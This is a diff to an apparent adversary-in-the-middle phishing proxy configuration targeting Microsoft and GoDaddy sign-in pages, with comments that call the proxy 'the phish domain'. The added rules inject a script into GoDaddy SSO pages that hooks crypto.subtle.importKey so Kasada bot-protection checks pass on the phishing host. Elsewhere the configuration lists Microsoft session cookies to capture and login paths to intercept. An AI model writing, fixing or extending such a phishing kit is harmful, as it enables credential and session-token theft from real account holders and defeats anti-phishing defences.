@@ -175,8 +175,16 @@ sub_filters:
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: '/notice?ru=https://{hostname}', replace: 'notice?ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'notice?ru=https://{hostname}', replace: '/notice?ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'ru=https://login.live.com', replace: 'ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURIComponent(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']} 
-  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURI(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']} 
+  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURIComponent(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURI(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+  # Kasada HMAC fix — inject into <head> so it runs BEFORE Kasada SDK loads.
+  # Kasada j-1.x derives X-Kpsdk-H key from window.location.hostname; when proxied
+  # that is the phish domain and GoDaddy rejects the request. This patch intercepts
+  # crypto.subtle.importKey and replaces the proxy hostname bytes with the real hostname
+  # so the HMAC is computed correctly, preventing the "Yikes! Something went wrong" block.
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
@@ -249,7 +257,6 @@ auth_urls:
   - '/landingv2'
   - '/v1/login'
   - '/sso/v1/login'
-  - '/v1/api/pass/login'
   - '/v1/api/pass/my/token'
   - '/saml/owa'
   - '/login/callback'
